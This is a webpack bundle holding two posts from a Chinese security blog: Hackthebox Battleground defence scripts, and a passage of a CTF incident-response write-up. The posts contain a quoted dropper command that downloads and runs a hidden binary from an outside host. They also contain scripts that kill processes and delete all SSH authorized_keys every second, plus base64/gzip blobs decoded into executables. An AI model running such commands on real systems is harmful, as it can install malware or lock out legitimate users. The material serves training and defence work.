"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[7964],{71693:n=>{n.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"Hackthebox Battleground Scripts","metadata":{"permalink":"/Target-Machines-WriteUp/blog/Hackthebox Battleground Scripts","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2025-04-17-HBG-Scripts/index.md","source":"@site/blog/2025-04-17-HBG-Scripts/index.md","title":"Hackthebox Battleground \u5999\u5999\u547d\u4ee4","description":"\u6de6\u4ed6","date":"2025-04-17T00:00:00.000Z","tags":[{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":8.275,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"Hackthebox Battleground Scripts","title":"Hackthebox Battleground \u5999\u5999\u547d\u4ee4","authors":"Randark","toc_max_heading_level":5,"tags":["Incident-Response"]},"unlisted":false,"nextItem":{"title":"2025 \u957f\u57ce\u676f & \u56fd\u8d5b \u534a\u51b3\u8d5b ISW","permalink":"/Target-Machines-WriteUp/blog/2025CCB&CISCN-Semis-ISW"}},"content":"\u6de6\u4ed6\\n\\n\x3c!-- truncate --\x3e\\n\\n## Web \u8fdb\u7a0b\u9632\u8303\\n\\n\u4ee5 Nginx \u4e3a\u4f8b\uff0c\u63d0\u53d6 Nginx \u7684\u4e3b\u8fdb\u7a0b\\n\\n```bash\\nroot@jmt-projekt:~# ps auxe | grep nginx | pgrep -f \\"nginx: master process\\"\\n3568483\\n```\\n\\n\u67e5\u770b\u8fdb\u7a0b\u6811\\n\\n```bash\\nroot@jmt-projekt:~# pstree -p 3568483\\nnginx(3568483)\u2500\u252c\u2500nginx(3568484)\\n               \u2514\u2500nginx(3568485)\\n```\\n\\n\u7b5b\u9009\u6240\u6709\u5b50\u8fdb\u7a0b\u7684 pid\\n\\n```bash\\nroot@jmt-projekt:~# pstree -p 3568483 | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\'\\n3568483\\n3568484\\n3568485\\n```\\n\\n\u68c0\u67e5\u6240\u6709\u5b50\u8fdb\u7a0b\u7684 process name\\n\\n```bash\\nroot@jmt-projekt:~# pstree -p 3568483 | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\' | xargs -I{} sh -c \'ps -o comm= -p {}\'\\nnginx\\nnginx\\nnginx\\n```\\n\\n\u663e\u793a\u6240\u6709\u975e nginx \u7684 process \u7684 pid\\n\\n```bash\\npstree -p 3568483 | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\' | xargs -I{} sh -c \'ps -o comm= -p {} | grep -qv nginx && echo {}\'\\nNone\\n```\\n\\n\u7136\u540e\u8c03\u7528 `kill -9` \u5f3a\u5236\u7ec8\u6b62\u8fdb\u7a0b\\n\\n```bash\\npstree -p 3568483 | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\' | xargs -I{} sh -c \'ps -o comm= -p {} | grep -qv nginx && kill -9 {}\'\\n```\\n\\n\u5b9e\u73b0\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u811a\u672c\\n\\n```bash\\n#!/bin/bash\\n\\n# \u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\\nLOG_FILE=\\"/var/log/nginx_kill_suspicious.log\\"\\n\\n# \u51fd\u6570\uff1a\u8bb0\u5f55\u65e5\u5fd7\\nlog() {\\n    local message=\\"$1\\"\\n    echo \\"$(date \'+%Y-%m-%d %H:%M:%S\') - $message\\" | tee -a \\"$LOG_FILE\\"\\n}\\n\\n# \u4e3b\u5faa\u73af\\nwhile true; do\\n    # \u83b7\u53d6 nginx \u4e3b\u8fdb\u7a0b\u7684 PID\\n    nginx_master_pid=$(ps auxe | grep nginx | pgrep -f \\"nginx: master process\\")\\n\\n    if [ -z \\"$nginx_master_pid\\" ]; then\\n        log \\"\u672a\u627e\u5230 nginx \u4e3b\u8fdb\u7a0b\uff0c\u8df3\u8fc7\u672c\u6b21\u68c0\u6d4b\u3002\\"\\n    else\\n        log \\"\u68c0\u6d4b\u5230 nginx \u4e3b\u8fdb\u7a0b PID: $nginx_master_pid\\"\\n\\n        # \u83b7\u53d6 nginx \u4e3b\u8fdb\u7a0b\u7684\u6240\u6709\u5b50\u8fdb\u7a0b\\n        all_child_pids=$(pstree -p \\"$nginx_master_pid\\" | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\')\\n\\n        if [ -z \\"$all_child_pids\\" ]; then\\n            log \\"\u672a\u68c0\u6d4b\u5230\u5b50\u8fdb\u7a0b\u3002\\"\\n        else\\n            # \u5217\u51fa\u6240\u6709\u5b50\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\\n            log \\"\u6240\u6709\u5b50\u8fdb\u7a0b\u4fe1\u606f\uff1a\\"\\n            for pid in $all_child_pids; do\\n                process_info=$(ps -o pid,comm,args= -p \\"$pid\\" --no-headers)\\n                log \\"PID: $process_info\\"\\n            done\\n\\n            # \u83b7\u53d6 nginx \u4e3b\u8fdb\u7a0b\u7684\u6240\u6709\u975e nginx \u5b50\u8fdb\u7a0b\\n            suspicious_pids=$(echo \\"$all_child_pids\\" | xargs -I{} sh -c \'ps -o comm= -p {} | grep -qv nginx && echo {}\')\\n\\n            if [ -z \\"$suspicious_pids\\" ]; then\\n                log \\"\u672a\u68c0\u6d4b\u5230\u53ef\u7591\u8fdb\u7a0b\u3002\\"\\n            else\\n                # \u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b\u5e76\u8bb0\u5f55\u65e5\u5fd7\\n                for pid in $suspicious_pids; do\\n                    process_info=$(ps -o pid,comm,args= -p \\"$pid\\" --no-headers)\\n                    log \\"\u68c0\u6d4b\u5230\u53ef\u7591\u8fdb\u7a0b PID: $process_info\uff0c\u6b63\u5728\u6740\u6b7b...\\"\\n                    kill -9 \\"$pid\\"\\n                    if [ $? -eq 0 ]; then\\n                        log \\"\u6210\u529f\u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b PID: $pid\\"\\n                    else\\n                        log \\"\u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b PID: $pid \u5931\u8d25\uff01\\"\\n                    fi\\n                done\\n            fi\\n        fi\\n    fi\\n\\n    # \u7b49\u5f85 1 \u79d2\\n    sleep 1\\ndone\\n```\\n\\n\u540c\u6837\u7684\uff0c\u53ef\u4ee5\u4e3a `apache2` \u5b9e\u73b0\u76f8\u540c\u7684\u6548\u679c\\n\\n```bash\\n#!/bin/bash\\n\\n# \u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\\nLOG_FILE=\\"/var/log/apache2_kill_suspicious.log\\"\\n\\n# \u51fd\u6570\uff1a\u8bb0\u5f55\u65e5\u5fd7\\nlog() {\\n    local message=\\"$1\\"\\n    echo \\"$(date \'+%Y-%m-%d %H:%M:%S\') - $message\\" | tee -a \\"$LOG_FILE\\"\\n}\\n\\n# \u4e3b\u5faa\u73af\\nwhile true; do\\n    # \u83b7\u53d6 apache2 \u4e3b\u8fdb\u7a0b\u7684 PID\\n    apache2_master_pid=$(ps auxe | grep apache2 | pgrep -f \\"apache2\\")\\n\\n    if [ -z \\"$apache2_master_pid\\" ]; then\\n        log \\"\u672a\u627e\u5230 apache2 \u4e3b\u8fdb\u7a0b\uff0c\u8df3\u8fc7\u672c\u6b21\u68c0\u6d4b\u3002\\"\\n    else\\n        log \\"\u68c0\u6d4b\u5230 apache2 \u4e3b\u8fdb\u7a0b PID: $apache2_master_pid\\"\\n\\n        # \u83b7\u53d6 apache2 \u4e3b\u8fdb\u7a0b\u7684\u6240\u6709\u5b50\u8fdb\u7a0b\\n        all_child_pids=$(pstree -p \\"$apache2_master_pid\\" | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\')\\n\\n        if [ -z \\"$all_child_pids\\" ]; then\\n            log \\"\u672a\u68c0\u6d4b\u5230\u5b50\u8fdb\u7a0b\u3002\\"\\n        else\\n            # \u5217\u51fa\u6240\u6709\u5b50\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\\n            log \\"\u6240\u6709\u5b50\u8fdb\u7a0b\u4fe1\u606f\uff1a\\"\\n            for pid in $all_child_pids; do\\n                process_info=$(ps -o pid,comm,args= -p \\"$pid\\" --no-headers)\\n                log \\"PID: $process_info\\"\\n            done\\n\\n            # \u83b7\u53d6 apache2 \u4e3b\u8fdb\u7a0b\u7684\u6240\u6709\u975e apache2 \u5b50\u8fdb\u7a0b\\n            suspicious_pids=$(echo \\"$all_child_pids\\" | xargs -I{} sh -c \'ps -o comm= -p {} | grep -qv apache2 && echo {}\')\\n\\n            if [ -z \\"$suspicious_pids\\" ]; then\\n                log \\"\u672a\u68c0\u6d4b\u5230\u53ef\u7591\u8fdb\u7a0b\u3002\\"\\n            else\\n                # \u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b\u5e76\u8bb0\u5f55\u65e5\u5fd7\\n                for pid in $suspicious_pids; do\\n                    process_info=$(ps -o pid,comm,args= -p \\"$pid\\" --no-headers)\\n                    log \\"\u68c0\u6d4b\u5230\u53ef\u7591\u8fdb\u7a0b PID: $process_info\uff0c\u6b63\u5728\u6740\u6b7b...\\"\\n                    kill -9 \\"$pid\\"\\n                    if [ $? -eq 0 ]; then\\n                        log \\"\u6210\u529f\u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b PID: $pid\\"\\n                    else\\n                        log \\"\u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b PID: $pid \u5931\u8d25\uff01\\"\\n                    fi\\n                done\\n            fi\\n        fi\\n    fi\\n\\n    # \u7b49\u5f85 1 \u79d2\\n    sleep 1\\ndone\\n```\\n\\n\u5c06\u4e24\u4e2a\u811a\u672c\u5408\u5e76\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u811a\u672c\\n\\n```bash\\n#!/bin/bash\\n\\n# \u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\\nLOG_FILE=\\"/var/log/web_kill_suspicious.log\\"\\n\\n# \u51fd\u6570\uff1a\u8bb0\u5f55\u65e5\u5fd7\\nlog() {\\n    local message=\\"$1\\"\\n    echo \\"$(date \'+%Y-%m-%d %H:%M:%S\') - $message\\" | tee -a \\"$LOG_FILE\\"\\n}\\n\\n# \u51fd\u6570\uff1a\u68c0\u6d4b\u5e76\u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b\\ncheck_and_kill_suspicious() {\\n    local service_name=\\"$1\\"\\n    local master_process_keyword=\\"$2\\"\\n\\n    # \u83b7\u53d6\u4e3b\u8fdb\u7a0b\u7684 PID\\n    local master_pid=$(pgrep -f \\"$master_process_keyword\\" | head -n 1)\\n\\n    if [ -z \\"$master_pid\\" ]; then\\n        log \\"\u672a\u627e\u5230 $service_name \u4e3b\u8fdb\u7a0b\uff0c\u8df3\u8fc7\u672c\u6b21\u68c0\u6d4b\u3002\\"\\n    else\\n        log \\"\u68c0\u6d4b\u5230 $service_name \u4e3b\u8fdb\u7a0b PID: $master_pid\\"\\n\\n        # \u83b7\u53d6\u4e3b\u8fdb\u7a0b\u7684\u6240\u6709\u5b50\u8fdb\u7a0b\\n        local all_child_pids=$(pstree -p \\"$master_pid\\" | grep -o \'([0-9]\\\\+)\' | grep -o \'[0-9]\\\\+\')\\n\\n        if [ -z \\"$all_child_pids\\" ]; then\\n            log \\"\u672a\u68c0\u6d4b\u5230 $service_name \u5b50\u8fdb\u7a0b\u3002\\"\\n        else\\n            # \u5217\u51fa\u6240\u6709\u5b50\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\\n            log \\"$service_name \u6240\u6709\u5b50\u8fdb\u7a0b\u4fe1\u606f\uff1a\\"\\n            for pid in $all_child_pids; do\\n                local process_info=$(ps -o pid,comm,args= -p \\"$pid\\" --no-headers)\\n                log \\"PID: $process_info\\"\\n            done\\n\\n            # \u83b7\u53d6\u4e3b\u8fdb\u7a0b\u7684\u6240\u6709\u975e\u670d\u52a1\u5b50\u8fdb\u7a0b\\n            local suspicious_pids=$(echo \\"$all_child_pids\\" | xargs -I{} sh -c \'ps -o comm= -p {} | grep -qv \'\\"$service_name\\"\' && echo {}\')\\n\\n            if [ -z \\"$suspicious_pids\\" ]; then\\n                log \\"\u672a\u68c0\u6d4b\u5230 $service_name \u53ef\u7591\u8fdb\u7a0b\u3002\\"\\n            else\\n                # \u6740\u6b7b\u53ef\u7591\u8fdb\u7a0b\u5e76\u8bb0\u5f55\u65e5\u5fd7\\n                for pid in $suspicious_pids; do\\n                    local process_info=$(ps -o pid,comm,args= -p \\"$pid\\" --no-headers)\\n                    log \\"\u68c0\u6d4b\u5230 $service_name \u53ef\u7591\u8fdb\u7a0b PID: $process_info\uff0c\u6b63\u5728\u6740\u6b7b...\\"\\n                    kill -9 \\"$pid\\"\\n                    if [ $? -eq 0 ]; then\\n                        log \\"\u6210\u529f\u6740\u6b7b $service_name \u53ef\u7591\u8fdb\u7a0b PID: $pid\\"\\n                    else\\n                        log \\"\u6740\u6b7b $service_name \u53ef\u7591\u8fdb\u7a0b PID: $pid \u5931\u8d25\uff01\\"\\n                    fi\\n                done\\n            fi\\n        fi\\n    fi\\n}\\n\\n# \u4e3b\u5faa\u73af\\nwhile true; do\\n    # \u68c0\u6d4b nginx\\n    check_and_kill_suspicious \\"nginx\\" \\"nginx: master process\\"\\n\\n    # \u68c0\u6d4b apache2\\n    check_and_kill_suspicious \\"apache2\\" \\"apache2\\"\\n\\n    # \u7b49\u5f85 1 \u79d2\\n    sleep 1\\ndone\\n```\\n\\n\u76f4\u63a5\u6295\u9012\u547d\u4ee4\\n\\n```bash\\necho H4sIAH4WAWgA/7VV32/bVBR+919xcJM60eZk6VszRbzwq1IRSDyhUUWufZNYdezMTn9AWylFgzQbtAVprTQyUDUGU7WQImAF0iZ/DL035qn/wq597cR2HNoX/GLr+txzvu873z135o3ssqpnlyWrwnEzQI6e48EROWxe9l7ZZ13cf8AtfvBu8Z2FxbcLfHZNMrOaUc6uo+XiiqppRWvVqqmyaqxaGbrOOxlw84I8Pr06f2L/coovHrOEHP2bSsMmB/TRDFnSoIosSyqjAp/I8e4ykisG8ImUItURCLeSH4vJqphUIPlePvl+PvmRkAYREt42HragjhCIEt3iI+S57RAC8qxB/niE/3pFnjZIp4f3u8PDb+zBd8MXjzi5guSVoqQrUSIRmBYy11QZFXWpGsDqUZCsOjKLNdOQKariCvp03TAVGjVHlXDCZsDeO8P7h5d/9ljZ4ZMH8OHCWzE5VKWQSNXKJqqBWKKc4nM7tCtIUkDUIZdmRdQS3APxs8AelcYt3YV6BeluBKtWBp60T0irj3dPIRHkBSN8V+df2We/2YMmab8kL4+ZgP80Pvc6pFkokpApPD2hwzZPuzZGxkBPU4e0GqTdwp0Dr03jao5YEu2UXFE1xclkOYJZddNxQS3CfguYkgYIqXt3xPmlT26lheCqtyh4GoZ1DJeZ1DKk5xQFRhRG6k0oyDTAu0e4+XeEN1XC7v407H15OTgmO93JyuFikd1sEz0A48LOUzJMoIRA1SFC8S4oRih0LLlvQFUvGa7gjnx0z23ZqFZvS2bZKjD5Xd1FUTdEx6DItNIxGSlyZohg2jBKxdDRuCn/7ZN/n35P2l/jh8eThgmc4NHR9l3jTZpom7dgw+ED4sLmNlgVEGUQGF+Hq0uT/vBNdH8NhHAbeAFmZ9kY29wOOivsrgieeHvdyGKBeRZyWazTmJKTk5COx9Ckju4JuiYCPdY2/491rp04QUre0AnWp4ONdJ7h9gsmQCaTCcvlP85lAOK8Byo2xO1k4k0Q0X24M7V5YdC7B/jhD6z0DXBPqxzb03Chm5cA/OOv9u/Pr8534ouV1Ill92hOifE+6cu9g+lZxf2T4V6XW6cnDEHdXEUju1Abul0EvazqG+7S1OsYeDeI995578L0zTW6aL2MUk2iqeauy+mF0az+l59n2Gnh/heQg+HP37pLlobocc9xDvnXRKof/S0JAAA= | base64 -d | gunzip > web-protect.sh ; chmod +x web-protect.sh\\n```\\n\\n## SSH \u5b89\u5168\u9632\u8303\\n\\n\u9996\u5148\u5148\u9650\u5236\u53ea\u5141\u8bb8 root \u7528\u6237\u8fdb\u884c\u8bbf\u95ee\\n\\n```bash\\nsudo sed -i \'/^AllowUsers/d\' /etc/ssh/sshd_config\\nsudo sed -i \'/^PermitRootLogin/d\' /etc/ssh/sshd_config\\necho \\"AllowUsers root\\" | tee -a /etc/ssh/sshd_config > /dev/null\\necho \\"PermitRootLogin yes\\" | tee -a /etc/ssh/sshd_config > /dev/null\\nsystemctl restart sshd\\n```\\n\\n\u6574\u5408\u4e3a\u4e00\u4e2a\u811a\u672c\\n\\n```bash\\n#!/bin/bash\\n\\n# \u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\\nLOG_FILE=\\"/var/log/ssh_security.log\\"\\n\\n# \u51fd\u6570\uff1a\u8bb0\u5f55\u65e5\u5fd7\\nlog() {\\n    local message=\\"$1\\"\\n    echo \\"$(date \'+%Y-%m-%d %H:%M:%S\') - $message\\" | tee -a \\"$LOG_FILE\\"\\n}\\n\\n# \u963b\u6b62\u975e root \u7528\u6237\u767b\u5f55\uff0c\u5e76\u5904\u7406 authorized_keys \u6587\u4ef6\\nrestrict_ssh_to_root() {\\n    log \\"\u6b63\u5728\u914d\u7f6e SSH \u53ea\u5141\u8bb8 root \u7528\u6237\u767b\u5f55...\\"\\n    sed -i \'/^AllowUsers/d\' /etc/ssh/sshd_config\\n    sed -i \'/^PermitRootLogin/d\' /etc/ssh/sshd_config\\n    echo \\"AllowUsers root\\" | tee -a /etc/ssh/sshd_config > /dev/null\\n    echo \\"PermitRootLogin yes\\" | tee -a /etc/ssh/sshd_config > /dev/null\\n    systemctl restart sshd\\n    log \\"SSH \u914d\u7f6e\u5df2\u66f4\u65b0\uff0c\u53ea\u5141\u8bb8 root \u7528\u6237\u767b\u5f55\u3002\\"\\n\\n    log \\"\u6b63\u5728\u5904\u7406 /home \u76ee\u5f55\u4e0b\u6240\u6709\u7528\u6237\u7684 authorized_keys \u6587\u4ef6...\\"\\n    for user_home in /home/*; do\\n        if [ -d \\"$user_home\\" ]; then\\n            auth_keys_file=\\"$user_home/.ssh/authorized_keys\\"\\n            # \u786e\u4fdd .ssh \u76ee\u5f55\u5b58\u5728\\n            mkdir -p \\"$user_home/.ssh\\"\\n            # \u521b\u5efa\u6216\u66f4\u65b0 authorized_keys \u6587\u4ef6\\n            touch \\"$auth_keys_file\\"\\n            # \u4fee\u6539\u6587\u4ef6\u6240\u6709\u8005\u4e3a root:root\\n            chown root:root \\"$auth_keys_file\\"\\n            # \u8bbe\u7f6e\u6587\u4ef6\u6743\u9650\u4e3a 600\\n            chmod 600 \\"$auth_keys_file\\"\\n            log \\"\u5df2\u5904\u7406 $auth_keys_file\uff1a\u6240\u6709\u8005\u8bbe\u7f6e\u4e3a root:root\uff0c\u6743\u9650\u8bbe\u7f6e\u4e3a 600\u3002\\"\\n        fi\\n    done\\n    log \\"\u6240\u6709\u7528\u6237\u7684 authorized_keys \u6587\u4ef6\u5df2\u5904\u7406\u5b8c\u6210\u3002\\"\\n}\\n\\n# \u5220\u9664\u6240\u6709 authorized_keys \u6587\u4ef6\uff0c\u5305\u62ec root \u7528\u6237\u7684\\ndelete_authorized_keys() {\\n    log \\"\u6b63\u5728\u5220\u9664\u6240\u6709\u7528\u6237\u7684 authorized_keys \u6587\u4ef6...\\"\\n    # \u5220\u9664 /home \u76ee\u5f55\u4e0b\u6240\u6709\u7528\u6237\u7684 authorized_keys \u6587\u4ef6\uff0c\u5e76\u8bb0\u5f55\u65e5\u5fd7\\n    find /home -name authorized_keys -delete -exec log \\"\u5df2\u5220\u9664\u6587\u4ef6: {}\\" \\\\;\\n    # \u5220\u9664 root \u7528\u6237\u7684 authorized_keys \u6587\u4ef6\\n    if [ -f \\"/root/.ssh/authorized_keys\\" ]; then\\n        rm -f \\"/root/.ssh/authorized_keys\\"\\n        log \\"\u5df2\u5220\u9664 /root/.ssh/authorized_keys \u6587\u4ef6\u3002\\"\\n    else\\n        log \\"/root/.ssh/authorized_keys \u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u8df3\u8fc7\u5220\u9664\u3002\\"\\n    fi\\n    log \\"\u6240\u6709 authorized_keys \u6587\u4ef6\u5df2\u5220\u9664\u3002\\"\\n}\\n\\n# \u4e3b\u51fd\u6570\\nmain() {\\n    restrict_ssh_to_root\\n\\n    # \u6bcf\u79d2\u8fd0\u884c\u4e00\u6b21 delete_authorized_keys\\n    while true; do\\n        delete_authorized_keys\\n        sleep 1\\n    done\\n}\\n\\n# \u6267\u884c\u4e3b\u51fd\u6570\\nmain\\n```\\n\\n\u5feb\u901f\u6295\u9012\\n\\n```bash\\necho H4sIAD04AmgA/51W32/bVBR+919xcBtlAzneXnhoNSQegCEVgah4QPywPPsmsWb7TvbNShmTCrQ01TKtQlu3tiuiMLQJrdkEaM2WdfljiG+cp/4Luz9cx/bSdHClRJF9vu9859zv3JupN/QLjq9fMMO6okwBvf1H1LtNN1b73Sfx/qPoxbIy9/EHxvsfzr13TtUvm4Hu4poehnUjRFYjcMhihT1QOTRaPaC3Hh8+34rbj6ODW5JJYW9PnYYrCrDlYst0wUNhaNbQOXX6rCoeI6uOQZ0+ZZsEQfmt0udaydNKNpTOz5Q+minNl0+DBtMJTIXvgCAEmskgR9JU5SpXMLzTpXu/DXd+gQBjAoObD2hzf7DZZWoOn7eip0+ie8uD9Z/AbJA6DpxvkW1cRIshyHKVAIUkcCxi8PIINjhJRnsNVLr3e3T3wXDl+uCgDfPz5yG68We08n3c7ryasVKpyPJCZIPmQFn/+l3XxQufhSgIdbsMOiIW7yT/2IaF/apTKwA+QYHnkE8Z9RyusV2ahJJdHKUQijLdGgeEd0C30WXdb7huhqSQFhZR+F+JwsWQIM8iLvCumgEBHj3qJG+e7GO0/xfd/oduMOe0JrTz36UfmMsKO5Hsp17HHoLBdpvF9TvX6NoSvbuWgLeWj9nudH+qOIAG65ghWFi5gk5/cxZsLAL4cqrwBWg281waqsJXs0DqyE+D+OLJRBqj6rjc5Gm8XuFNK4iREo7WFAx22/3eDvDQpKBo7w6rNBfmXbSdALRLWTWCvcgWNbej7jPa3JAdPs74WRDBDavOiPN1FIn7vTa9+VTCZbvjpZV+55nYtxn+lQMwVy34o3cn0sftF8wZCf3Oj8PNdc799pkzBVYP2/zpCXzCMMxmiVsKsezASiuQeXN1MFdKBaN3LKNw4xF/1RE/beyjjEFfy4Spqqjdos11QSuOsqj563DzniQ5BsvnpbVCrz3MDcvWsmIjFxFkFFDjTrJslteelyNx/2/s5EGcuyJkD307IdR8k30X0ZqsCjT0DbJGWyoLEMwzcOWqCl/O5kXmezNpAuSIV0HVOWb8tL4y8oF3EiQNzWuG4yGJqNRjyA2lsVKWE7H9znV5brB2x/t/x71VmTXlTDybseoEh46gwpv9Tlfe9YpnOn7qq3HXpzyx2d+KRzcG93+Oe+vxbqvfWaIPd2G8S0X8Qp3NJZCggXJn8ASEuHJchC7B2dEsCrF07b7ImZX8EkllffD0CAAA | base64 -d | gunzip > ssh-protect.sh ; chmod +x ssh-protect.sh\\n```"},{"id":"2025CCB&CISCN-Semis-ISW","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2025CCB&CISCN-Semis-ISW","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2025-03-16-2024CCB&CISCN-Semis-ISW/index.md","source":"@site/blog/2025-03-16-2024CCB&CISCN-Semis-ISW/index.md","title":"2025 \u957f\u57ce\u676f & \u56fd\u8d5b \u534a\u51b3\u8d5b ISW","description":"2025 \u957f\u57ce\u676f & \u56fd\u8d5b \u534a\u51b3\u8d5b ISW \u5e94\u6025\u54cd\u5e94","date":"2025-03-16T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":8.21,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2025CCB&CISCN-Semis-ISW","title":"2025 \u957f\u57ce\u676f & \u56fd\u8d5b \u534a\u51b3\u8d5b ISW","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"Hackthebox Battleground \u5999\u5999\u547d\u4ee4","permalink":"/Target-Machines-WriteUp/blog/Hackthebox Battleground Scripts"},"nextItem":{"title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 WinFT","permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-WinFT"}},"content":"2025 \u957f\u57ce\u676f & \u56fd\u8d5b \u534a\u51b3\u8d5b ISW \u5e94\u6025\u54cd\u5e94\\n\\n\u5b98\u65b9 writeup \u672a\u516c\u5e03\uff0c\u65e0\u6807\u51c6\u7b54\u6848\\n\\n\x3c!-- truncate --\x3e\\n\\n:::info\\n\\n\u5c0f\u8def\u662f\u4e00\u540d\u7f51\u7edc\u5b89\u5168\u7f51\u7ba1\uff0c\u636e\u53cd\u6620\u53d1\u73b0\u516c\u53f8\u4e3b\u673a\u4e0a\u6709\u5f02\u5e38\u5916\u8054\u4fe1\u606f\uff0c\u636e\u56de\u5fc6\u524d\u6bb5\u65f6\u95f4\u6267\u884c\u8fc7\u67d0\u4e9b\u66f4\u65b0\u811a\u672c (\u5df2\u5220\u9664)\uff0c\u73b0\u5728\u9700\u8981\u534f\u52a9\u5c0f\u8def\u540c\u5b66\u8fdb\u884c\u7f51\u7edc\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u5206\u6790\uff0c\u67e5\u627e\u6728\u9a6c\uff0c\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u5bfb\u627e\u653b\u51fb\u6e90\u5934\uff0c\u83b7\u53d6\u653b\u51fb\u8005\u4e3b\u673a\u6743\u9650\u83b7\u53d6 flag \u6587\u4ef6\u3002\\n\\n\u5165\u53e3\u4e3b\u673a\u8bf7\u901a\u8fc7 ssh \u8fdb\u884c\u767b\u5f55\uff0c\u767b\u5f55\u53e3\u4ee4\u4e3a\uff1aubuntu/admin\\\\_123456\uff0c\u5982\u9700 root \u6743\u9650\u8bf7\u4f7f\u7528 sudo\uff1b\\n\\n- \u7b2c\u4e00\u5c42\u89e3\u538b\u5bc6\u7801\uff1a`5e9c5e0370a9c29816b44dfbe2ae5a8d`\\n- \u7b2c\u4e8c\u5c42\u89e3\u538b\u5bc6\u7801\uff1a`81c7e0d7a82ee016e304fb847c31e497`\\n\\n\u9644\u4ef6\u4e0b\u8f7d -> [Release \u9644\u4ef6\u4e0b\u8f7d\u30fbCTF-Archives/2024-CCB-CISCN-Semis](https://github.com/CTF-Archives/2024-CCB-CISCN-Semis/releases/tag/Attachment)\\n\\n:::\\n\\n## First of all\\n\\n\u9898\u76ee\u63d0\u4f9b\u7684\u662f `.raw` \u683c\u5f0f\u7684\u78c1\u76d8\u955c\u50cf\\n\\n```plaintext\\n\u5165\u53e3\u4e3b\u673a dd \u955c\u50cf. raw\\n```\\n\\n\u5c1d\u8bd5\u4f7f\u7528 `R-Studio` \u8fdb\u884c\u52a0\u8f7d\\n\\n![img](img/image_20250329-182942.png)\\n\\n![img](img/image_20250331-183122.png)\\n\\nroot \u7528\u6237\u76ee\u5f55\u4e0b\u65e0\u6587\u4ef6\\n\\n![img](img/image_20250332-183252.png)\\n\\n\u5b58\u5728\u6709\u975e root \u7528\u6237 `ubuntu`\\n\\n![img](img/image_20250334-183415.png)\\n\\n## 1\\n\\n> \u627e\u51fa\u4e3b\u673a\u4e0a\u6728\u9a6c\u56de\u8fde\u7684\u4e3b\u63a7\u7aef\u670d\u52a1\u5668 IP \u5730\u5740 (\u4e0d\u5b9a\u65f6 (3\\\\~5 \u5206\u949f) \u5468\u671f\u6027)\uff0c\u5e76\u4ee5 `flag{MD5}` \u5f62\u5f0f\u63d0\u4ea4\uff0c\u5176\u4e2d MD5 \u52a0\u5bc6\u76ee\u6807\u7684\u539f\u59cb\u5b57\u7b26\u4e32\u683c\u5f0f `IP:port`\\n\\n\u5728 `ubuntu` \u7528\u6237\u76ee\u5f55\u4e0b\u627e\u5230\u4e00\u4e2a `txt` \u6587\u672c\u6587\u4ef6\\n\\n```plaintext title=\\"/home/ubuntu/1.txt\\"\\nwget \u2013quiet http://mirror.unknownrepo.net/f/l/a/g/system_upgrade -O /tmp/.system_upgrade && chmod +x /tmp/.system_upgrade && /tmp/.system_upgrade\\n```\\n\\n\u8bf4\u660e\u66fe\u4ece `http://mirror.unknownrepo.net/f/l/a/g/system_upgrade` \u4e0b\u8f7d\u6587\u4ef6\u5e76\u50a8\u5b58\u4e3a `/tmp/.system_upgrade`\\n\\n\u5728\u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728\u6709 `viminfo` 